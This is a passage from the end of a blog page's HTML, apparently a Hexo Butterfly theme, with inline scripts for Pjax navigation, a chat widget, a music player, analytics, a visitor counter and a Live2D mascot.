      $crisp.push(["do", "chat:open"])

    });
  }
  chatBtnFn()
} else {
  if (false) {
    function chatBtnHide () {
      $crisp.push(["do", "chat:hide"])
    }
    function chatBtnShow () {
      $crisp.push(["do", "chat:show"])
    }
  }
}</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = [
  'title',
  '#config-diff',
  '#body-wrap',
  '#rightside-config-hide',
  '#rightside-config-show',
  '.js-pjax'
]

if (false) {
  pjaxSelectors.unshift('meta[property="og:image"]', 'meta[property="og:title"]', 'meta[property="og:url"]')
}

var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {

  // removeEventListener scroll 
  window.removeEventListener('scroll', window.tocScrollFn)
  window.removeEventListener('scroll', scrollCollect)

  typeof preloader === 'object' && preloader.initLoading()
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')

})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof chatBtnFn === 'function' && chatBtnFn()
  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // Analytics
  if (false) {
    MtaH5.pgv()
  }

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()

  typeof preloader === 'object' && preloader.endLoading()
})

document.addEventListener('pjax:error', (e) => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>